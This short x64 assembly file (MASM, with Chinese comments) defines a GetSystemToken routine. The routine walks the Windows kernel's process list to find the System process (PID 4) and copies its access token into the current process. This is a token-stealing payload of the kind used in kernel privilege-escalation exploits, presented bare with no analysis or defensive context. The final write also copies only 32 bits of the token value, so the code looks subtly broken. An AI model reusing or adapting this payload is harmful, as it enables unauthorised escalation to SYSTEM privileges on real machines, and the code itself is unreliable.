.DATA		;数据段
.CODE		;代码段
GetSystemToken PROC	;定义函数，函数名和cpp文件内声明函数一样


push rax
push rcx
push rdx

xor rax, rax
mov rax, gs: [rax + 188h]
mov rax, [rax + 070h]
mov rcx, rax
mov rdx, 4; 

SearchSystemPID:
	mov rax, [rax + 0188h]
	sub rax, 0188h
	cmp [rax + 0180h], rdx
	jne SearchSystemPID

mov rdx, [rax + 0208h]
mov[rcx + 0208h], edx

pop rdx
pop rcx
pop rax

ret
GetSystemToken ENDP;
END